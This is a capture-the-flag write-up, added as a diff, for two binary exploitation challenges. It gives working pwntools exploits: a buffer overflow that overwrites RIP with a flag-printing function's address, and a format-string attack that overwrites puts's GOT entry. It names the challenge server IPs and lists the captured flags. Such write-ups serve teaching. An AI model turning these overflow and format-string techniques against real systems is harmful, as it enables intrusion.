@@ -1,0 +1,51 @@
+
+Voting Machine 1
+
+Simple Buffer overflow challenge where you have to overwrite RIP with the 'super_secret_function'(method which prints flag).
+
+Idea to solve the challenge:
+
+[*] Offset to reach RIP is 10bytes and then overwrite RIP with '0x400807' to print the flag.
+
+Exploit:
+
+from pwn import *
+
+super_secret_function = 0x400807
+payload = "A"*10
+payload += p64(super_secret_function)
+print payload
+
+➜ pwn python payload.py| nc 13.48.67.196 50000
+
+Flag: watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_https://www.youtube.com/watch?v=Va4aF6rRdqU}
+
+
+Voting Machine 2
+
+Bianry had a format string vulnerability as first argument of printf was controlled by user.
+
+Idea to solve the challenge:
+
+[*] Overwrite the GOT of puts with ‘0x08420736’ (method that prints flag). if you are not sure what is GOT 
+    and how it works i recommend you to read this writeup. The reason for 
+    choosing GOT of puts is becuase it is been invoked more than once before printf.
+
+Here is the exploit for the challenge.
+
+from pwn import *
+
+get_got = 0x8422020
+
+writes = {0x08422020:0x08420736}
+
+payload = 'AA'
+payload += fmtstr_payload(8, writes, numbwritten=2)
+
+p = remote("13.53.125.206", 50000)
+p.recvuntil("Topic: ")
+p.sendline(payload)
+p.interactive()
+
+The flag is – watevr{GOT_som3_fl4g_for_you_https://www.youtube.com/watch?v=hYeFcSq7Mxg}  
+
